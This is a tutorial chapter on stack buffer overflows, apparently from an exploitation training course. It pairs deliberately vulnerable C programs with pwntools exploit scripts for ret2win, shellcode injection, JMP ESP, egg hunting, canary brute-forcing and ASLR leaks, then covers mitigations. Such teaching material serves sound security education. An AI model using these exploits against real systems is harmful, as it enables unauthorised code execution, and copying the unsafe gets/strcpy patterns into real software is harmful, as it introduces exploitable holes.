# Buffer Overflows

Buffer overflows are one of the most common and fundamental vulnerabilities in software. They occur when a program writes more data to a buffer than it was designed to hold, potentially overwriting adjacent memory.

## Understanding Buffer Overflows

### What is a Buffer Overflow?

A buffer overflow occurs when:
1. **Input exceeds buffer size** - More data is written than allocated
2. **No bounds checking** - Program doesn't validate input length
3. **Adjacent memory overwritten** - Critical data gets corrupted
4. **Control flow hijacked** - Return addresses or function pointers modified

### Memory Layout Review

```
Stack Frame Layout:
High Address
┌─────────────────────┐
│   Function Args     │
├─────────────────────┤
│   Return Address    │ ← Target for overflow
├─────────────────────┤
│   Saved Frame Ptr   │
├─────────────────────┤
│   Local Variables   │ ← Buffer location
│   (including buffer)│
└─────────────────────┘
Low Address
```

## Vulnerable Code Examples

### Basic Stack Buffer Overflow

```c
// vuln1.c - Basic overflow
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[64];              // 64-byte buffer
    printf("Enter input: ");
    gets(buffer);                 // Dangerous: no bounds checking!
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable_function();
    printf("Returned to main safely\n");
    return 0;
}
```

**Compilation:**
```bash
# Disable modern protections for learning
gcc -fno-stack-protector -no-pie -z execstack -o vuln1 vuln1.c

# Check protections
checksec vuln1
```

### Strcpy Overflow

```c
// vuln2.c - strcpy overflow
#include <stdio.h>
#include <string.h>

void process_input(char *input) {
    char buffer[32];
    strcpy(buffer, input);        // Dangerous: no length check!
    printf("Processed: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    process_input(argv[1]);
    return 0;
}
```

### Off-by-One Error

```c
// vuln3.c - Off-by-one
#include <stdio.h>
#include <string.h>

void copy_string(char *src) {
    char dest[16];
    int i;
    
    // Copy until null terminator or buffer size
    for (i = 0; i <= 16 && src[i] != '\0'; i++) {  // BUG: i <= 16 should be i < 16
        dest[i] = src[i];
    }
    
    printf("Copied: %s\n", dest);
}

int main(int argc, char *argv[]) {
    if (argc != 2) return 1;
    copy_string(argv[1]);
    return 0;
}
```

## Exploitation Methodology

### Step 1: Crash Analysis

```python
#!/usr/bin/env python3
from pwn import *

# Generate crash
context.log_level = 'debug'
p = process('./vuln1')

# Send long input to cause crash
payload = b'A' * 100
p.sendline(payload)
p.wait()

print("Program crashed - investigating core dump")
```

### Step 2: Finding the Offset

```python
#!/usr/bin/env python3
from pwn import *

def find_offset():
    # Generate unique pattern
    pattern = cyclic(100)
    
    # Start process and send pattern
    p = process('./vuln1')
    p.sendline(pattern)
    p.wait()
    
    # Analyze core dump
    core = Coredump('./core')
    
    # Find offset where return address was overwritten
    crash_address = core.read(core.rsp, 8)
    offset = cyclic_find(crash_address[:4])
    
    print(f"Offset found: {offset}")
    return offset

offset = find_offset()
```

### Manual Offset Finding

```python
#!/usr/bin/env python3
from pwn import *

def manual_offset_finding():
    # Try different offsets
    for i in range(60, 80):
        try:
            p = process('./vuln1')
            
            # Create payload with known value at potential return address
            payload = b'A' * i + b'BBBB'
            p.sendline(payload)
            p.wait()
            
            # Check if we hit the return address
            core = Coredump('./core')
            if core.read(core.rsp, 4) == b'BBBB':
                print(f"Offset found: {i}")
                return i
                
        except:
            continue
    
    print("Offset not found in range")
    return None

manual_offset_finding()
```

### Step 3: Control Flow Hijacking

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def control_eip():
    offset = 72  # Discovered offset
    
    # Try to control return address
    p = process('./vuln1')
    
    payload = b'A' * offset
    payload += p64(0x4141414142424242)  # Controlled return address
    
    p.sendline(payload)
    p.wait()
    
    # Verify we control RIP
    core = Coredump('./core')
    rip = core.read(core.rsp, 8)
    print(f"RIP controlled: {hex(u64(rip))}")

control_eip()
```

## Classic Exploitation Techniques

### Ret2Win (Return to Win Function)

```c
// ret2win.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("Congratulations! You win!\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);
}

int main() {
    printf("ret2win challenge\n");
    vulnerable();
    return 0;
}
```

**Exploit:**
```python
#!/usr/bin/env python3
from pwn import *

context.binary = './ret2win'
elf = ELF('./ret2win')

def exploit():
    p = process('./ret2win')
    
    # Find win function address
    win_addr = elf.symbols['win']
    print(f"Win function at: {hex(win_addr)}")
    
    # Build payload
    offset = 72
    payload = b'A' * offset
    payload += p64(win_addr)
    
    # Send payload
    p.sendline(payload)
    p.interactive()

exploit()
```

### Return to Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.binary = './vuln1'

def ret2shellcode():
    p = process('./vuln1')
    
    # Generate shellcode
    shellcode = asm(shellcraft.sh())
    
    # Find buffer address (requires leak or guessing)
    buffer_addr = 0x7fffffffe000  # Example address
    
    # Build payload
    offset = 72
    payload = shellcode
    payload += b'A' * (offset - len(shellcode))
    payload += p64(buffer_addr)  # Return to buffer
    
    p.sendline(payload)
    p.interactive()

ret2shellcode()
```

### JMP ESP Technique (x86)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def jmp_esp_exploit():
    # Find JMP ESP gadget
    elf = ELF('./vuln32')
    
    # Search for JMP ESP instruction (0xFFE4)
    jmp_esp = None
    for addr in elf.search(b'\xff\xe4'):
        jmp_esp = addr
        break
    
    if not jmp_esp:
        print("JMP ESP not found")
        return
    
    print(f"JMP ESP found at: {hex(jmp_esp)}")
    
    # Generate shellcode
    shellcode = asm(shellcraft.sh())
    
    # Build payload
    offset = 68  # 32-bit offset
    payload = b'A' * offset
    payload += p32(jmp_esp)      # Overwrite return address
    payload += shellcode         # Shellcode on stack after return
    
    p = process('./vuln32')
    p.sendline(payload)
    p.interactive()

jmp_esp_exploit()
```

## Advanced Buffer Overflow Techniques

### Egg Hunting

```python
#!/usr/bin/env python3
from pwn import *

def egg_hunter():
    context.arch = 'i386'
    
    # Egg marker (should be unique)
    egg = b'W00T'
    
    # Egg hunter shellcode
    egghunter = asm(f'''
    next_page:
        or dx, 0x0fff
    next_addr:
        inc edx
        lea ebx, [edx+4]
        push byte +0x21
        pop eax
        int 0x80
        cmp al, 0xf2
        jz next_page
        
        mov eax, {u32(egg)}    # First half of egg
        mov edi, edx
        scasd
        jnz next_addr
        
        mov eax, {u32(egg)}    # Second half of egg  
        scasd
        jnz next_addr
        
        jmp edi                # Jump to shellcode after egg
    ''')
    
    # Full shellcode with egg marker
    full_shellcode = egg + egg + asm(shellcraft.sh())
    
    # Exploit payload
    offset = 72
    payload = egghunter.ljust(offset, b'A')
    payload += p64(buffer_address)  # Return to egghunter
    
    return payload, full_shellcode
```

### Multi-stage Payloads

```python
#!/usr/bin/env python3
from pwn import *

def multi_stage_exploit():
    context.arch = 'amd64'
    
    # Stage 1: Read larger payload
    stage1 = asm(f'''
        # read(stdin, buffer, size)
        xor rax, rax        # sys_read
        xor rdi, rdi        # stdin
        mov rsi, {hex(buffer_addr)}  # buffer address
        mov rdx, 1000       # size
        syscall
        
        # Jump to read payload
        mov rax, {hex(buffer_addr)}
        jmp rax
    ''')
    
    # Stage 2: Full shellcode
    stage2 = asm(shellcraft.sh())
    
    # Initial overflow
    offset = 72
    payload1 = stage1.ljust(offset, b'A')
    payload1 += p64(buffer_addr)
    
    return payload1, stage2
```

## Protection Mechanisms and Bypasses

### Stack Canaries

```c
// canary_example.c
#include <stdio.h>

void vulnerable() {
    char buffer[64];
    printf("Buffer at: %p\n", buffer);
    printf("Enter input: ");
    gets(buffer);
    printf("Function returned normally\n");
}

int main() {
    vulnerable();
    return 0;
}
```

**Compile with canary:**
```bash
gcc -fstack-protector-all -o canary_vuln canary_example.c
```

**Canary Bypass - Bruteforce:**
```python
#!/usr/bin/env python3
from pwn import *
import string

def bruteforce_canary():
    context.log_level = 'error'  # Reduce noise
    
    canary = b''
    
    # Bruteforce canary byte by byte
    for i in range(8):  # 64-bit canary
        for c in range(256):
            p = process('./canary_vuln')
            
            # Payload to overwrite one more byte of canary
            payload = b'A' * 72  # Fill buffer + saved rbp
            payload += canary + bytes([c])
            
            p.sendline(payload)
            
            # Check if program crashed
            try:
                output = p.recvall(timeout=1)
                if b"stack smashing detected" not in output:
                    canary += bytes([c])
                    print(f"Canary byte {i}: 0x{c:02x}")
                    p.close()
                    break
            except:
                pass
            
            p.close()
    
    print(f"Full canary: {canary.hex()}")
    return canary
```

### ASLR and Information Leaks

```python
#!/usr/bin/env python3
from pwn import *

def leak_stack_address():
    """Use format string to leak stack addresses"""
    p = process('./format_vuln')
    
    # Leak stack values using format string
    payload = b'%lx.' * 20  # Leak 20 stack values
    p.sendline(payload)
    
    response = p.recvline()
    leaks = response.split(b'.')
    
    for i, leak in enumerate(leaks):
        try:
            addr = int(leak, 16)
            if 0x7fff00000000 <= addr <= 0x7fffffffffff:  # Stack range
                print(f"Stack address {i}: 0x{addr:016x}")
        except:
            continue
    
    p.close()

def defeat_aslr_with_leak():
    """Combine information leak with buffer overflow"""
    
    # Phase 1: Leak addresses
    p = process('./vuln_with_leak')
    
    # Trigger information leak
    p.sendline(b'1')  # Menu option to leak
    leak = p.recvline()
    
    # Parse leaked address
    stack_leak = int(leak.split()[-1], 16)
    buffer_addr = stack_leak - 0x100  # Calculate buffer address
    
    print(f"Leaked stack: 0x{stack_leak:016x}")
    print(f"Buffer at: 0x{buffer_addr:016x}")
    
    # Phase 2: Exploit with known address
    p.sendline(b'2')  # Menu option for overflow
    
    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(72, b'A')
    payload += p64(buffer_addr)  # Return to shellcode
    
    p.sendline(payload)
    p.interactive()
```

## Debugging Buffer Overflows

### GDB Analysis

```bash
# Compile with debug info
gcc -g -fno-stack-protector -no-pie -o vuln_debug vuln.c

# Start GDB
gdb ./vuln_debug

# Useful GDB commands for buffer overflow analysis
(gdb) set disassembly-flavor intel
(gdb) break vulnerable
(gdb) run
(gdb) info registers
(gdb) x/32wx $rsp          # Examine stack
(gdb) x/10i $rip           # Examine instructions
(gdb) stepi                # Step one instruction
(gdb) bt                   # Backtrace
```

### GDB with pwntools

```python
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

def debug_exploit():
    # Start process with GDB attached
    p = gdb.debug('./vuln1', '''
        set disassembly-flavor intel
        break vulnerable
        break *vulnerable+50
        continue
    ''')
    
    # Send payload after GDB is ready
    raw_input("Press enter when GDB is ready...")
    
    offset = 72
    payload = b'A' * offset + p64(0x4141414141414141)
    
    p.sendline(payload)
    p.interactive()

debug_exploit()
```

### Core Dump Analysis

```python
#!/usr/bin/env python3
from pwn import *

def analyze_crash():
    # Generate crash
    p = process('./vuln1')
    p.sendline(b'A' * 100)
    p.wait()
    
    # Analyze core dump
    core = Coredump('./core')
    
    print(f"Crash at RIP: 0x{core.rip:016x}")
    print(f"RSP: 0x{core.rsp:016x}")
    
    # Show stack contents
    print("\nStack contents:")
    for i in range(10):
        addr = core.rsp + i * 8
        try:
            value = u64(core.read(addr, 8))
            print(f"0x{addr:016x}: 0x{value:016x}")
        except:
            break
    
    # Show registers
    print(f"\nRegisters:")
    print(f"RAX: 0x{core.rax:016x}")
    print(f"RBX: 0x{core.rbx:016x}")
    print(f"RCX: 0x{core.rcx:016x}")

analyze_crash()
```

## Mitigation Techniques

### Input Validation

```c
// secure_input.c
#include <stdio.h>
#include <string.h>

void safe_input() {
    char buffer[64];
    printf("Enter input (max 63 chars): ");
    
    // Safe input with bounds checking
    if (fgets(buffer, sizeof(buffer), stdin)) {
        // Remove newline if present
        size_t len = strlen(buffer);
        if (len > 0 && buffer[len-1] == '\n') {
            buffer[len-1] = '\0';
        }
        
        printf("You entered: %s\n", buffer);
    }
}

// Safe string copy
void safe_copy(const char *src, char *dest, size_t dest_size) {
    strncpy(dest, src, dest_size - 1);
    dest[dest_size - 1] = '\0';  // Ensure null termination
}
```

### Modern Compiler Protections

```bash
# Compile with all protections
gcc -fstack-protector-strong \
    -fPIE -pie \
    -D_FORTIFY_SOURCE=2 \
    -Wl,-z,relro,-z,now \
    -o secure_program program.c

# Check applied protections
checksec secure_program
```

## Practice Challenges

### Challenge 1: Basic Overflow
Write an exploit for a simple gets() overflow to call a win function.

### Challenge 2: Offset Discovery
Find the exact offset for a buffer overflow without using cyclic patterns.

### Challenge 3: Shellcode Injection
Exploit a buffer overflow to execute custom shellcode.

### Challenge 4: Canary Bypass
Bypass stack canaries using information leaks or bruteforce.

## Key Takeaways

!!! important "Buffer Overflow Fundamentals"
    - **Input validation is critical** - Always check buffer bounds
    - **Understand memory layout** - Know where return addresses are stored
    - **Use pattern generation** - Cyclic patterns help find exact offsets
    - **Control flow hijacking** - Overwriting return addresses enables code execution
    - **Modern protections exist** - Canaries, ASLR, and DEP make exploitation harder

!!! warning "Common Mistakes"
    - Using dangerous functions like gets(), strcpy() without bounds checking
    - Assuming buffer sizes without validation
    - Off-by-one errors in loop conditions
    - Not null-terminating strings properly
    - Ignoring compiler warnings about unsafe functions

!!! tip "Exploitation Tips"
    - Start with simple ret2win challenges
    - Use debugging tools to understand crashes
    - Practice finding offsets with different methods
    - Learn to work around modern protections
    - Understand the relationship between C code and assembly

---

*Next: [Shellcode Development](03-shellcode.md)*
